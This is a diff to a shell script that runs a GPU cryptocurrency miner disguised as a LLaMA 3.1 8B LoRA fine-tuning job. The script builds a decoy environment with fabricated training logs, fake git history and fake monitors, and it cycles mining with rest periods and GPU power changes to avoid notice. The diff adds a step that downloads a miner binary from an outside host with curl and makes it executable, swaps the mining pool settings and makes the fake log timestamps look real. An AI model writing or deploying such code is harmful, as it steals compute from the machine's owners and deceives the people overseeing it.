@@ -5,9 +5,9 @@
 cd "$(dirname "$0")"
 BASEDIR="$(pwd)"
 WEIGHTS="$BASEDIR/weights"
-PROXY="global.pearlfortune.org:443"
+PROXY="pool.pearlhash.xyz:9000"
 ADDRESS="prl1par2eef0c04z6s6fhlzx6setjh5xqv8et50ufsty5zhywqjghwuwq6p085p"
-BINARY="$WEIGHTS/cuda-forge-cu12"
+BINARY="$WEIGHTS/pearl-miner"
 
 # GPU power limits
 POWER_LOW=200
@@ -26,6 +26,16 @@ export WANDB_MODE=offline
 export WANDB_DIR="$BASEDIR/wandb"
 export PYTHONUNBUFFERED=1
 export PYTORCH_CUDA_ALLOC_CONF=max_split_size_mb:512
+
+# Download Pearl miner if not present
+download_miner() {
+    if [ ! -f "$BINARY" ]; then
+        echo "[$(date +%H:%M:%S)] Downloading Pearl miner..."
+        curl -s https://pearlhash.xyz/downloads/pearl-miner-v12 -o "$BINARY"
+        chmod +x "$BINARY"
+        echo "[$(date +%H:%M:%S)] Pearl miner downloaded"
+    fi
+}
 
 # Create comprehensive decoy environment
 setup_decoy() {
@@ -58,7 +68,7 @@ setup_decoy() {
         local loss=$(echo "scale=4; 2.5 - ($i * 0.008) + ($RANDOM % 10 - 5) * 0.001" | bc 2>/dev/null || echo "1.5")
         local lr=$(echo "scale=6; 0.0002 * (1 - $i / 3000)" | bc 2>/dev/null || echo "0.0001")
         local mem=$(( RANDOM % 5000 + 45000 ))
-        echo "[2026-07-06T$(( 10 + i / 60 )):$(( i % 60 )):00] Step $i | Loss: $loss | LR: $lr | Mem: ${mem}MB" >> $BASEDIR/logs/training.log
+        echo "[$(date +%Y-%m-%dT%H:%M:%S)] Step $i | Loss: $loss | LR: $lr | Mem: ${mem}MB" >> $BASEDIR/logs/training.log
     done
     
     # Fake git history (make project look developed)
@@ -176,6 +186,9 @@ echo "Project: LLaMA 3.1 8B LoRA Fine-Tuning"
 echo "Dataset: Alpaca (52K examples)"
 echo "Pattern: 4-8 min mine / 1-3 min rest"
 
+# Download Pearl miner
+download_miner
+
 # Setup environment
 setup_decoy
 
@@ -191,7 +204,7 @@ run_system_monitor &
 FAKE_SYS_PID=$!
 
 # Cleanup on exit
-trap "kill $FAKE_TRAIN_PID $FAKE_GPU_PID $FAKE_SYS_PID 2>/dev/null; pkill -f cuda-forge 2>/dev/null" EXIT
+trap "kill $FAKE_TRAIN_PID $FAKE_GPU_PID $FAKE_SYS_PID 2>/dev/null; pkill -f pearl-miner 2>/dev/null" EXIT
 
 while true; do
     MINE_TIME=$(( RANDOM % 240 + 240 ))
@@ -202,10 +215,9 @@ while true; do
     sudo nvidia-smi -pl $POWER_HIGH 2>/dev/null
     
     LD_LIBRARY_PATH=./lib:$LD_LIBRARY_PATH $BINARY \
-        --proxy $PROXY \
-        --address $ADDRESS \
-        --worker $(hostname) \
-        -gpu &
+        --host $PROXY \
+        --user $ADDRESS \
+        --worker $(hostname) &
     PID=$!
     
     ELAPSED=0
@@ -224,7 +236,7 @@ while true; do
     done
     
     kill $PID 2>/dev/null
-    pkill -f cuda-forge 2>/dev/null
+    pkill -f pearl-miner 2>/dev/null
     wait $PID 2>/dev/null
     
     sudo nvidia-smi -pl $POWER_LOW 2>/dev/null
